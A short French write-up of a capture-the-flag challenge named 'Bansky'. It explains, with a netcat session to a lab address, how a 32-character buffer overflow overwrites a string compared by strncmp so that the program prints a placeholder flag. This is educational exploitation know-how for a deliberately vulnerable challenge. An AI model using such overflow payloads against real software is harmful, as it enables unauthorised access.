### Bansky

Sur IDA, on peut voir que deux chaines de caractères sont comparées, et si le contenu de la première est `Monkey Parliament`, le programme nous donne le flag. Le problème, c'est qu'on ne peut pas modifier cette première chaine de caractères (du moins en théorie), ce qui fait que la comparaison n'aboutit jamais.

Cependant, en faisant un `buffer overflow`, c'est-à-dire en "débordant" de la variable dans laquelle nous pouvons écrire sur celle qui est comparée par le `strncmp`, on peut changer le contenu de la variable comparée.

Le plan est simple : la variable dans laquelle nous pouvons écrire a une taille maximum de `0x20`, soit 32 caractères.

Si on remplit le contenu de cette variable, le reste de ce qu'on écrira sera stocké dans la variable qui est comparée !

Voilà ce que j'ai rentré :

```console
┌──(birsol㉿Kali)-[~]
└─$ nc 10.0.0.4 6161   
                        .s$$$Ss.
            .8,         $$$. _. .              ..sS$$$$$'  ...,.;
 o.   ,@..  88        =.$'$'  '          ..sS$$$$$$$$$$$$s. _;''
  @@@.@@@. .88.   `  ` ''l. .sS$$.._.sS$$$$$$$$$$$$S'''
   .@@@q@@.8888o.         .s$$$$$$$$$$$$$$$$$$$$$'
     .:`@@@@33333.       .>$$$$$$$$$$$$$$$$$$$$'
     .: `@@@@333'       ..>$$$$$$$$$$$$$$$$$$$'
      :  `@@333.     `.,   s$$$$$$$$$$$$$$$$$'
      :   `@33       $$ S.s$$$$$$$$$$$$$$$$$'
      .S   `Y      ..`  ,'$' `$$$$$$$$$$$$$$
      $s  .       ..S$s,    . .`$$$$$$$$$$$$.
      $s .,      ,s ,$$$$,,sS$s.$$$$$$$$$$$$$.
      / /$$SsS.s. ..s$$$$$$$$$$$$$$$$$$$$$$$$$.
     /`.`$$$$$dN.ssS$$'`$$$$$$$$$$$$$$$$$$$$$$$.
    ///   `$$$$$$$$$'    `$$$$$$$$$$$$$$$$$$$$$$.
   ///|     `S$$S$'       `$$$$$$$$$$$$$$$$$$$$$$.
  / /                      $$$$$$$$$$$$$$$$$$$$$.
                           `$$$$$$$$$$$$$$$$$$$$$s.
                            $$$''        .?T$$$$$$$
                           .$'        ...      ?$$#
                           !       -=S$$$$$s
                         .!       -=s$$'  `$=-_      :
                        ,        .$$$'     `$,       .|
                       ,       .$$$'          .        ,
                      ,     ..$$$'
                          .s$$$'                 `s     .
                   .   .s$$$$'                    $s. ..$s
                  .  .s$$$$'                      `$s=s$$$
                    .$$$$'                         ,    $$s
               `   ' .$$'                               $$$
               ,   s$$'                              .  $$$s
            ` .s..s$'                                .s ,$$
             .s$$$'                                   's$$$,
          -   $$$'                                     .$$$$.
        .'  .s$$s                                     .$',',$.
        $s.s$$$$S..............   ................    $$....s$s......
         `'''           `     ```'''''''''''''''         `''   ``

Wasup Aldo, did you see me in Banksy's latest work?
[1]Yeah ahah, I saw you, you look pretty good
[2]Absolutely not Rafiki, Stop seeing yourself everywhere
>1
Thanks man, What was its name again?
ssssssssssssssssssssssssssssssssMonkey Parliament
This is it ahah, what a funny guy Banksy is
Oh by the way, this is the key you asked me for last time 
ZiTF{flag}
```